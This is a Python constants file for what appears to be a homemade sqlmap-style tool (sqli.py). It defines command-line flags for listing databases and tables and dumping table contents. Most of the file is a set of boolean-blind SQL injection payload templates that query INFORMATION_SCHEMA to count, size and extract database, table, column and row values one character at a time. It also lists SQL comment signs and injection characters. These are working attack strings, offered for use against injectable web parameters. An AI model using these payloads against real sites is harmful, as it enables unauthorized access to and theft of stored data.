# communication with user
SQLI_DETECTED_MSG = "SQLi may have been detected!\n"
SQLI_NOT_DETECTED_MSG = "SQLi not detected. \n"
SQLI_NO_COMMENT_SIGN_DETECTED = "Cannot find commenting option. \n"
BOOLEAN_BSQLI_ENABLED = "Boolean blind sqli is possible! \n"
BOOLEAN_BSQLI_DISABLED = "Boolean blind sqli is not possible. \n"
ILLEGAL_USE_OF_FLAGS_ERROR = "Illegal use of flags! \n"
REQUEST_FILE_NOT_SPECIFIED_ERROR = "You must use the r flag and specify a request file! \n"
PARAMETER_NOT_SPECIFIED_ERROR = "You must use the p flag and specify a parameter you want to check! \n"
ACTION_NOT_SPECIFIED_ERROR = "You specify the action you want to do! \n"
TABLES_DBNAME_NOT_SPECIFIED_ERROR = "can't use --tables without specifying a db! \n"
DUMP_NOT_SPECIFIED_ERROR = "can't use --dump without specifying a db and a table! \n"
HELLO_MESSAGE = "python sqli.py -r request_file -p parameter [-d db_name] [-t table_name] ACTION \n" \
                "-r : a path to the request file we will copy. \n" \
                "-p : the get / post parameter we want to test. \n" \
                "ACTION: \n" \
                "--dbs : returns all the db names. \n" \
                "--tables : returns all the tables names in a specified db. \n" \
                "--dump : dumps the data from a specified table and db."
FILE_NOT_FOUND_ERROR = "Request file not found! \n"
DB_NOT_FOUND = "The DB specified not found. \n"
TABLE_NOT_FOUND = "The table specified not found in the db. \n"
FORMAT_TABLE_DICT = "{:<10} "

# chars and seperators
HEADER_SEP = ": "
AMPERSAND = "&"
EQUAL_SIGN = "="
APOSTROPHE = '\''
GT_SIGN = ">"
LT_SIGN = "<"

# strings and flags for the program
NOT_DETECTED = "no"
BOOLEAN_FALSE_RESPONSE_INDEX = 0
BOOLEAN_TRUE_RESPONSE_INDEX = 1
STRING_PLACEHOLDER = "%s"
FIND_DB_NAMES = 0
FIND_TABLE_NAMES = 1
DUMP_TABLE = 2
NO_ACTION = -1

# constants
MAX_NUM_OF_DBS_TO_CHECK = 20
MAX_NUM_OF_COLUMNS = 20
MAX_NUM_OF_TABLES_TO_CHECK = 400
MAX_LEN_OF_STRING = 50
ASCII_LOWER_BOUND = 32
ASCII_UPPER_BOUND = 126
ASCII_UPPER_CASE_LOWER_BOUND = 65
ASCII_UPPER_CASE_UPPER_BOUND = 90
FROM_UPPER_TO_LOWER = 32
# sql queries
# Blind Boolean-based sql injection:
# check if option exists:
BLIND_BOOLEAN_ALWAYS_FALSE = "\' AND 1=0%s"
BLIND_BOOLEAN_ALWAYS_TRUE = "\' OR 1=1%s"
# check amount of dbs:
BLIND_BOOLEAN_COUNT_DBS = "\' or (SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME) = %s%s"
BLIND_BOOLEAN_DB_NAME_LENGTH = "\' or (SELECT LENGTH(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME LIMIT %s,1) = %s%s"
BLIND_BOOLEAN_DB_NAME_CHAR = "\' or (SELECT ASCII(UPPER(SUBSTRING(SCHEMA_NAME, %s, 1))) FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME LIMIT %s,1) %s %s%s"
BLIND_BOOLEAN_DB_NAME_EXISTS = "\' or (SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME = \'%s\') = 1%s"

BLIND_BOOLEAN_COUNT_TABLES = "\' or (SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = \'%s\' ORDER BY TABLE_NAME) = %s%s"
BLIND_BOOLEAN_TABLE_NAME_LENGTH = "\' or (SELECT LENGTH(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = \'%s\' ORDER BY TABLE_NAME LIMIT %s,1) = %s%s"
BLIND_BOOLEAN_TABLE_NAME_CHAR = "\' or (SELECT ASCII(UPPER(SUBSTRING(TABLE_NAME, %s, 1))) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = \'%s\' ORDER BY TABLE_NAME LIMIT %s,1) %s %s%s"
BLIND_BOOLEAN_TABLE_NAME_EXISTS = "\' or (SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = \'%s\' AND TABLE_SCHEMA = \'%s\') = 1%s"

BLIND_BOOLEAN_COUNT_COLUMNS = "\' or (SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = \'%s\' AND TABLE_NAME = \'%s\' ORDER BY TABLE_NAME) = %s%s"
BLIND_BOOLEAN_COLUMN_NAME_LENGTH = "\' or (SELECT LENGTH(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = \'%s\' AND TABLE_NAME = \'%s\' ORDER BY COLUMN_NAME LIMIT %s,1) = %s%s"
BLIND_BOOLEAN_COLUMN_NAME_CHAR = "\' or (SELECT ASCII(UPPER(SUBSTRING(COLUMN_NAME, %s, 1))) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = \'%s\' AND TABLE_NAME = \'%s\' ORDER BY COLUMN_NAME LIMIT %s,1) %s %s%s"

BLIND_BOOLEAN_COUNT_ROWS = "\' or (SELECT COUNT(*) FROM %s.%s) = %s%s"
BLIND_BOOLEAN_ELEMENT_LENGTH = "\' or (SELECT LENGTH(%s) FROM %s.%s ORDER BY %s LIMIT %s,1) = %s%s"
BLIND_BOOLEAN_ELEMENT_CHAR = "\' or (SELECT ASCII(UPPER(SUBSTRING(%s, %s, 1))) FROM %s.%s ORDER BY %s LIMIT %s,1) %s %s%s"



UPPER_FUNCTION = "UPPER("
UPPER = "UPPER"
# flags for operating the program
READ_REQUEST_FILE_FLAG = '-r'
PARAMETER_FLAG = "-p"
RETURN_DBNAMES_FLAG = "--dbs"
RETURN_TABLESNAMES_FLAG = "--tables"
DUMP_TABLE_FLAG = "--dump"
DB_FLAG = "-d"
TABLE_FLAG = "-t"
HELP_FLAG = "-h"
# lists of Strings
SQL_ERRORS = ["you have an error in your sql syntax"]
SQL_COMMENTS = [" -- ", "#"]
SQLI_CHARS = ["\'", "\0", "\\", "-", "%", "#"]
